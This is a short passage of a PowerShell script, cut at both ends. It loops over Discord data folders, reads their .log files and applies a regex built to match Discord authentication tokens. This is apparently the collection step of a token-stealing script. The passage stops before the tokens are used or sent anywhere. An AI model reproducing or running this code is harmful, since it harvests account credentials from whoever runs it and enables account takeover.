        foreach ($p in $discordPaths) {
            if (Test-Path $p) {
                Get-ChildItem $p -Filter *.log -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]"[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{25,68}"
